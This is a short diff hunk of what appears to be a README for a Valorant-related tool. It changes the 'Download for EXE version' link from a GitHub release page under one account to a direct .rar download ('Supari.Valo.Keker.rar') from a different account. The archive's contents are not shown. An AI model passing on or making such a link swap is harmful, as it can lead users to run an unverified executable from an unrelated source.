@@ -19,7 +19,7 @@
 
 ### Download for EXE version:
 
-https://github.com/EndlessGod/ValoPy/releases/tag/v1.0
+https://github.com/RipxtarGamer/Supari-Valo/releases/download/v1/Supari.Valo.Keker.rar
 
 ------------
 
